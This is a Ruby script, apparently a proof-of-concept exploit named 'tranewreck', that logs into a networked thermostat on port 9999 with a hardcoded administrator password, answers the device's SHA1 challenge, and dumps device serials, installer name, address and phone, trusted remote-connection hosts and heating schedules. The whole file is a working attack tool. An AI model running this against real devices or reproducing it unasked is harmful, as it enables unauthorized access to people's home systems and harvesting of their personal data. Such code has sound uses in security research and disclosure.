#!/usr/bin/env ruby

require 'digest'
require 'socket'
require 'optparse'
require 'json'
require 'yaml'
require 'base64'
require 'timeout'

class Breaker

  @options = {}

  command = OptionParser.new do |opt|
    opt.banner = "Usage: tranewreck.rb -t [TARGET] [options]"
    opt.separator  ""
    opt.separator  "options"
    opt.on("-h","--help","help") do
      puts command
    end
    opt.on("-t","--target IP","where?") do |name|
      @options[:target] = name
    end
    opt.on("-s","--stay","fire subscribe and stay connected") do|stay_connected|
      @options[:stay_connected] = true
    end
  end

  command.parse!
  target = @options[:target] || nil
  remain_connected = @options[:stay_connected] || false
  hostname = target
  port = 9999
  password = "Cold,,2100"
  permission = "ADMN"
  auth_id = ""
  auth_history = []

  auth_id = ""
  home = {
    installer: {},
    device: {}
  }

  def self.authenticate(sock)
    password = "Cold,,2100"
    permission = "ADMN"
    rcv = sock.gets
    puts "Auth Challenge : "+rcv
    rcv= rcv.chop
    puts rcv
    rcv =~/1::evChallenge\((?<arg>.*),"(?<challenge>.*)"\);/
    arg = $~[:arg]
    challenge = $~[:challenge]
    puts " - Arg: #{arg}"
    puts " - challenge: #{challenge}"
    evchallenge = challenge.gsub(/([^"]{2})/){|str| str.hex.chr}
    msg = arg.to_i.chr + password+ evchallenge
    puts " - Processed 'evchallenge': #{evchallenge}"
    puts " - Processed 'msg': #{msg}"
    login_response = "1::login(#{arg},\"#{Digest::SHA1.hexdigest(msg).upcase}\",\"#{permission}\",\"DefaultLabel\",,,,,);\n"
    puts " - Assembled login command: :#{login_response}"
    auth_response = poke(sock, login_response, /\);\n/)
    auth_response =~ /1::evAuthorized\((?<auth>\d*)\);/
    auth_id = $~[:auth]
    if @options[:redis]
      redis.set("auth_id", auth_id)
      auth_history << auth_id
      redis.set("auth_history", @auth_history)
    end
    return auth_id
  end


  def self.poke(sock, data, terminator = /End\(\);\n/, dump = false)
    buf =  ''
    puts " - Sending: #{data}"
    sock.puts(data)
    begin
      line = sock.gets
      puts line if dump
      buf <<  line
    end until buf.match(terminator)
    return buf
  end


  def self.parse(data)
    ordered_data =[]
    data =~ /(?<smil_id>(\d\.|\d)+)::(?<command_verb>([0-9]|[a-z])+)\((?<payload>.*)\);/i
    dat = data.scan(/(?<smil_id>(\d\.|\d)+)::(?<command_verb>([0-9]|[a-z])+)\((?<payload>.*)\)/i) do |smil_id, command_verb, payload|
      ordered_data << {smil_id: smil_id, command_verb: command_verb, payload: payload.split(',')} unless payload.split(',').empty?
    end
    return ordered_data
  end

  def self.connect(host, port, timeout = 5)
    addr = Socket.getaddrinfo(host, nil)
    sockaddr = Socket.pack_sockaddr_in(port, addr[0][3])

    Socket.new(Socket.const_get(addr[0][0]), Socket::SOCK_STREAM, 0).tap do |socket|
      socket.setsockopt(Socket::IPPROTO_TCP, Socket::TCP_NODELAY, 1)
      begin
        socket.connect_nonblock(sockaddr)
      rescue IO::WaitWritable
        if IO.select(nil, [socket], nil, timeout)
          begin
            socket.connect_nonblock(sockaddr)
          rescue Errno::EISCONN
          rescue
            puts "rescued"
            raise
          end
        else
          socket.close
          raise "Connection timeout"
        end
      end
    end
  end
  unless !target
    s = connect(target, port)

    if auth = authenticate(s)
      puts "Authenticated"
      puts "Auth ID: "+auth
    end
    if device_data = poke(s, "1.3::requestAttributes(TRUE);\n", /::evAttributes.+\);\n$/)
      device_properties = parse(device_data)[0]
      home[:device][:system_name] = device_properties[:payload][0]
      home[:device][:auid] = device_properties[:payload][1]
      home[:device][:manufacturer] =  device_properties[:payload][2]
      home[:device][:model] = device_properties[:payload][3].gsub('"','')
      home[:device][:serial_number] = device_properties[:payload][4].gsub('"','')
      home[:device][:version_id] = device_properties[:payload][6]
      home[:device][:platform] = device_properties[:payload][8]
    end

    if installer_data = poke(s, "1.9.4::subscribe(TRUE);\n", /::evData.+\);\n$/)
      installer_properties = parse(installer_data)[0]
      home[:installer][:name] = installer_properties[:payload][0].gsub('"','')
      home[:installer][:address] = installer_properties[:payload][2].gsub('"','')
      home[:installer][:city] = installer_properties[:payload][4].gsub('"','')
      home[:installer][:state] = installer_properties[:payload][5].gsub('"','')
      home[:installer][:zipcode] = installer_properties[:payload][6].gsub('"','')
      home[:installer][:phone] = installer_properties[:payload][7].gsub('"','')
      home[:installer][:website] = installer_properties[:payload][9].gsub('"','')
      home[:installer][:phone_aux] = installer_properties[:payload][10].gsub('"','')
    end

    if nexia_data = poke(s, "1.11.1::requestEvent();\n")
      nexia_properties = parse(nexia_data)
      home[:trusted_connections] = []
      nexia_properties.each do |con|
        if con[:command_verb] == 'evListItem'
          home[:trusted_connections] << {id: con[:payload][0], name: con[:payload][1].gsub('"','')}
        end
      end
      if home[:trusted_connections].count > 0
        home[:trusted_connections].each do |trusted_connection|
          if con_details = poke(s, "1.11.1.#{trusted_connection[:id]}::requestAttributes();\n", /\);\n/)
            details = parse(con_details)[0]
            trusted_connection[:host] = details[:payload][0].gsub('"','')
            trusted_connection[:port] = details[:payload][1]
            trusted_connection[:secure_callout_enabled] = details[:payload][2]
            trusted_connection[:encrypted_AUID_supported] = details[:payload][3]
          end
        end
      end
    end

    if schedule_data = poke(s,"1.8.1::subscribe(FALS);\n")
    end
    schedules = []
    parsed_schedules = []
    schedule_detail = []
    if matches = schedule_data.scan( /1\.8\.1::evListItem\(([0-9]{5}),\"(.+)\"\);/i)
      while matches.count > 0
        data = matches.shift(1)
        schedules << {id: data[0][0], name: data[0][1]}
      end
    end
    schedules.each do |schedule|
      if schedule_detail_data = poke(s,"1.8.1.#{schedule[:id]}.1::subscribe(TRUE);\n")
        id_matches = schedule_detail_data.scan( /1\.8\.1\.[0-9]*\.1::evListItem\(([0-9]*),"([a-z]*)"\);\n/i)
        id_matches.each do |step|
          detail_data = poke(s,"1.8.1.#{schedule[:id]}.1.#{step[0]}::subscribe(FALS);\n", /\);/)
          data = detail_data.scan( /1\.8\.1\.[0-9]*\.1\.[0-9]*::evData\("([a-z]+)","([a-z]+)",([a-z]{3}),"([0-9]{2}:[0-9]{2})",([0-9]{2}\.[0-9]{2}),([0-9]{2}\.[0-9]{2})\);/i)
          parsed_schedules << {name: data[0][0], group: data[0][1], weekday: data[0][2], start: data[0][3], high: data[0][4], low: data[0][5]}
        end
      end
    end

    home[:schedules] = parsed_schedules
    puts home.to_yaml
    if remain_connected
      if subscribed = poke(s,"1::subscribe(TRUE);\n",/$a/, true)
      else
        s.close    # Close the socket when done
      end
    end
  end
end